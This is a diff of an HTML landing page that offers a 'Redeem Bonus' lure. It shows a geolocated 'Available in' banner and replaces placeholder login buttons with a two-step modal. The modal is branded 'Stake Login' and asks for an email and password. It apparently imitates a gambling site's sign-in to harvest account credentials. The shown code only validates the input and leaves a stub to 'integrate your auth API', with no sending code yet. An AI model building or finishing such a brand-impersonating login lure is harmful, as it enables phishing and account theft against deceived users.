@@ -38,22 +38,18 @@
       text-decoration: none;
       transition: all 0.3s ease;
       box-shadow: 0 4px 15px rgba(2,136,209,0.4);
-      position: relative;
-      overflow: hidden;
       margin-top: 1rem;
       cursor: pointer;
     }
     .btn:hover { transform: scale(1.05); box-shadow: 0 6px 20px rgba(2,136,209,0.6); }
     .btn:active { transform: scale(0.98); }
-
     @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
     footer { margin-top: 2rem; font-size: 0.85rem; color: #64748b; }
     .country-info { margin-bottom: 1rem; font-weight: 600; font-size: 1rem; color: #ffd700; }
     .bonus-info { margin-bottom: 1rem; font-size: 1rem; color: #a5f3fc; }
     .counter { margin-bottom: 1rem; font-size: 1rem; font-weight: 600; color: #facc15; }
 
-    /* Login Modal Styles */
+    /* Modal */
     .modal {
       display: none;
       position: fixed;
@@ -65,28 +61,68 @@
     }
     .modal-content {
       background: rgba(27,38,59,0.95);
-      padding: 2rem;
+      padding: 1.5rem;
       border-radius: 20px;
-      text-align: center;
-      max-width: 400px;
+      max-width: 380px;
       width: 90%;
+      position: relative;
+      color: #f8fafc;
+    }
+    .close-modal {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      cursor: pointer;
+      font-size: 1.2rem;
+      color: white;
     }
     .modal h2 { color: #4fc3f7; margin-bottom: 1rem; }
-    .login-btn {
-      display: block;
-      width: 100%;
-      padding: 0.75rem;
-      margin: 0.5rem 0;
+
+    /* Step 1 */
+    #step1 { text-align: center; }
+    #step1 .btn { width: 100%; }
+
+    /* Step 2 (Login Form from your file) */
+    #step2 { display: none; }
+    form#loginForm {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 1rem;
+      text-align: left;
+    }
+    form#loginForm label { font-size: 0.85rem; color: #cbd5e1; }
+    form#loginForm input {
+      padding: 0.5rem;
+      border-radius: 8px;
+      border: none;
+      font-size: 0.9rem;
+    }
+    .field-row { display: flex; gap: 8px; }
+    .show-password {
+      background: transparent;
+      border: none;
+      color: #94a3b8;
+      cursor: pointer;
+      font-size: 0.8rem;
+    }
+    .links {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.8rem;
+    }
+    .remember { display: flex; align-items: center; gap: 4px; }
+    #loginForm button {
+      padding: 0.6rem;
       border-radius: 50px;
       border: none;
       font-weight: 600;
       cursor: pointer;
-      transition: 0.3s;
+      background: linear-gradient(90deg, #4fc3f7, #0288d1);
+      color: white;
     }
-    .login-btn.google { background: #db4437; color: white; }
-    .login-btn.normal { background: #0288d1; color: white; }
-    .login-btn:hover { opacity: 0.9; }
-    .close-modal { position: absolute; top: 10px; right: 20px; cursor: pointer; font-size: 1.2rem; color: white; }
+    #loginForm button:hover { opacity: 0.9; }
+    .error { color: #f87171; font-size: 0.8rem; display: none; }
   </style>
 </head>
 <body>
@@ -99,13 +135,42 @@
     <div class="btn" id="redeemBtn">Redeem Bonus</div>
   </div>
 
-  <!-- Login Modal -->
+  <!-- Modal -->
   <div class="modal" id="loginModal">
     <div class="modal-content">
       <span class="close-modal" id="closeModal">&times;</span>
-      <h2>Login to Claim Bonus</h2>
-      <button class="login-btn google" onclick="loginGoogle()">Login with Google</button>
-      <button class="login-btn normal" onclick="loginNormal()">Login with Username</button>
+      
+      <!-- Step 1 -->
+      <div id="step1">
+        <h2>Login with your Stake Account</h2>
+        <div class="btn" id="continueBtn">Continue</div>
+      </div>
+
+      <!-- Step 2 (full login form) -->
+      <div id="step2">
+        <h2>Stake Login</h2>
+        <form id="loginForm" novalidate>
+          <div>
+            <label for="email">Email</label>
+            <input id="email" name="email" type="email" placeholder="you@company.com" required />
+            <div id="emailError" class="error">Please enter a valid email.</div>
+          </div>
+          <div>
+            <label for="password">Password</label>
+            <div class="field-row">
+              <input id="password" name="password" type="password" minlength="6" placeholder="Enter your password" required />
+              <button type="button" id="togglePwd" class="show-password">Show</button>
+            </div>
+            <div id="pwdError" class="error">Password must be at least 6 characters.</div>
+          </div>
+          <div class="links">
+            <label class="remember"><input id="remember" name="remember" type="checkbox"/> Remember me</label>
+            <a href="#">Forgot?</a>
+          </div>
+          <button type="submit">Sign in</button>
+          <div id="submitMsg" class="error" role="status"></div>
+        </form>
+      </div>
     </div>
   </div>
 
@@ -115,21 +180,57 @@
     const redeemBtn = document.getElementById('redeemBtn');
     const loginModal = document.getElementById('loginModal');
     const closeModal = document.getElementById('closeModal');
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const continueBtn = document.getElementById('continueBtn');
 
-    redeemBtn.addEventListener('click', () => loginModal.style.display = 'flex');
+    redeemBtn.addEventListener('click', () => {
+      loginModal.style.display = 'flex';
+      step1.style.display = 'block';
+      step2.style.display = 'none';
+    });
     closeModal.addEventListener('click', () => loginModal.style.display = 'none');
     window.addEventListener('click', (e) => { if(e.target === loginModal) loginModal.style.display = 'none'; });
+    continueBtn.addEventListener('click', () => {
+      step1.style.display = 'none';
+      step2.style.display = 'block';
+    });
 
-    // Placeholder login functions
-    function loginGoogle() {
-      alert("Redirect to Google OAuth login (implement backend OAuth here)");
-      // Example: window.location.href = "YOUR_GOOGLE_OAUTH_URL";
-    }
-    function loginNormal() {
-      alert("Show normal username/password login (implement form submission here)");
-    }
+    // Login form logic
+    const form = document.getElementById('loginForm');
+    const email = document.getElementById('email');
+    const password = document.getElementById('password');
+    const emailError = document.getElementById('emailError');
+    const pwdError = document.getElementById('pwdError');
+    const submitMsg = document.getElementById('submitMsg');
+    const toggle = document.getElementById('togglePwd');
 
-    // Country & Counter scripts
+    toggle.addEventListener('click', () => {
+      const t = password.getAttribute('type') === 'password' ? 'text' : 'password';
+      password.setAttribute('type', t);
+      toggle.textContent = t === 'password' ? 'Show' : 'Hide';
+    });
+
+    function validateEmail(v){ return /\S+@\S+\.\S+/.test(v); }
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      let ok = true;
+      emailError.style.display = 'none';
+      pwdError.style.display = 'none';
+      submitMsg.style.display = 'none';
+
+      if(!validateEmail(email.value)){ emailError.style.display = 'block'; ok = false; }
+      if(!password.value || password.value.length < 6){ pwdError.style.display = 'block'; ok = false; }
+
+      if(!ok) return;
+
+      submitMsg.style.display = 'block';
+      submitMsg.style.color = 'lightgreen';
+      submitMsg.textContent = 'Form looks good (static demo). Integrate your auth API here.';
+    });
+
+    // Country & Counter
     function getFlagEmoji(countryCode) {
       return countryCode.toUpperCase().replace(/./g, char => String.fromCodePoint(127397 + char.charCodeAt()));
     }
@@ -139,7 +240,6 @@
         const data = await response.json();
         const countryCode = data.country_code;
         const countryName = data.country_name;
-        const ip = data.ip;
         const countryInfoDiv = document.getElementById('country-info');
         countryInfoDiv.textContent = `Available in ${countryName} ${getFlagEmoji(countryCode)}`;
       } catch (err) {
@@ -163,4 +263,3 @@
   </script>
 </body>
 </html>
-
